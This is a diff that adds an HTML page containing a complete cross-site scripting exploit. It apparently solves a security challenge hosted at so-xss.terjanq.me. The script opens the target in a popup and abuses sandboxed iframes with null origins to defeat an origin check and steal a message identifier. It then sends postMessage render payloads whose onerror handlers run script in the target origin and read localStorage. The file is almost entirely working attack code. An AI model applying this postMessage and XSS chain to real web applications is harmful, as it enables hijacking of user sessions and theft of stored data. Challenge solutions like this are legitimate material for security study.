@@ -1,0 +1,32 @@
+<body>
+  <script>
+    f = document.createElement('iframe');
+    
+    // Needed flags
+    f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
+    
+    // Second communication with /iframe.php (this is the top page relocated)
+    // This will execute the alert in the correct origin
+    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
+      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
+    },1000);`.replaceAll('\n',' ');
+   
+   // Initial communication
+   // Open /iframe.php in a popup, both iframes and popup will have "null" as origin
+   // Then, bypass window.origin === e.origin to steal the identifier and communicate
+   // with the top with the second XSS payload
+    f.srcdoc = `
+    <h1>Click me!</h1>
+    <script>
+      onclick = e => {
+        let w = open('http://so-xss.terjanq.me/iframe.php');
+        onmessage = e => top.location = 'http://so-xss.terjanq.me/iframe.php';
+        setTimeout(_ => {
+          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
+        }, 1000);
+      };
+    <\/script>
+    `
+    document.body.appendChild(f);
+  </script>
+</body>
